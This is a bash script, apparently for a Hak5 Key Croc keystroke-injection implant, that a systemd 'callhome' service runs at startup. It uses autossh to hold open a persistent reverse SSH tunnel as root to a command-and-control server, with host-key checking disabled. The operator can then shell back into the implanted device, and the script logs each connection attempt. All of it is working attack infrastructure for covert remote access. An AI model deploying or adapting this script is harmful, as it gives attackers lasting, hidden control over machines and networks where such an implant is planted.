#!/bin/bash
#
# Starts autossh to connect to C2
# this script is managed by callhome.service in /etc/systemd/system
#
#
# Setting Up:
# - generate an rsa key using ssh-keygen
# - upload the private key here in /root/.ssh/
# - run chmod 600 on the private key file
# - copy the public key to the server, by ssh-copy-id or public key and add it to 
#   authorized_keys file of the server.
# - once connected, remote back in to this host using ssh root@127.0.0.1 on the specified tunnel
#   port
#
# SSH reverse tunnel configuration
#
# Below config will connect to the remote server.
# i.e. ssh user@153.231.21.50 -i /root/.ssh/id_rsa and will use the tunnel port to create
# a reverse ssh tunnel to connect back to this host. 

# The server which the keycroc will connect to
C2_SERVER="CLOUD_C2"

# Username that will be used to log in to the remote server
USER="root"

# RSA key file to be used to authenticate to the remote server.
KEY_FILE=/root/.ssh/id_rsa

# Tunnel port to be used in connecting back to this host.
# Monitor port for autossh (use 0 to disable this feature)
# See: https://linux.die.net/man/1/autossh
MON_PORT=0
TUN_PORT=2222

# Logging
# the host will try to connect to the remote server time by time. logs are located in
# /var/log/callhome.log to debug, verify the connection.
LOG_DIR=/var/log/callhome.log

# Logging timestamp function
TIMESTAMP() {
  date "+%Y-%m-%d %H:%M:%S"
}

c2_callhome() {
  echo "[`TIMESTAMP`] Service started.." >> ${LOG_DIR} ; sleep 2 
  echo "[`TIMESTAMP`] Setting up reverse SSH tunnel to specified host (${C2_SERVER})" >> ${LOG_DIR}
  echo "[`TIMESTAMP`] Connecting to ${C2_SERVER} using $USER username and keyfile located in ${KEY_FILE}.." >> ${LOG_DIR}
  autossh -M ${MON_PORT} \
          -L ${TUN_PORT}:127.0.0.1:22 \
          -R ${TUN_PORT}:127.0.0.1:22 \
          -i ${KEY_FILE} \
          -N \
          -f \
          -T \
          -q \
          -o "PubkeyAuthentication=yes" \
          -o "PasswordAuthentication=no" \
          -o "UserKnownHostsFile=/dev/null" \
          -o "StrictHostKeyChecking=no" \
          -o "ServerAliveInterval 30" \
          -o "ServerAliveCountMax 3" \
          -o "ExitOnForwardFailure=yes" \
          ${USER}@${C2_SERVER}
  sleep 2

  CHECK_CON=`netstat -plnt | grep ${TUN_PORT} | head -n1 | awk {'print $6'}`
  
  if [[ $CHECK_CON == "LISTEN" ]]; then
    echo "[`TIMESTAMP`] Successfully established reverse ssh tunnel on the remote server (${C2_SERVER}).." >> ${LOG_DIR}
    echo "[`TIMESTAMP`] On the remote server, execute ssh -p ${TUN_PORT} root@localhost to connect back to ${HOSTNAME}.."
  else
    echo "[`TIMESTAMP`] ERROR: SSH reverse tunnel failed. Unable to connect to the remote server (${C2_SERVER}).." >> ${LOG_DIR}
  fi
}

main() {
  c2_callhome
}

main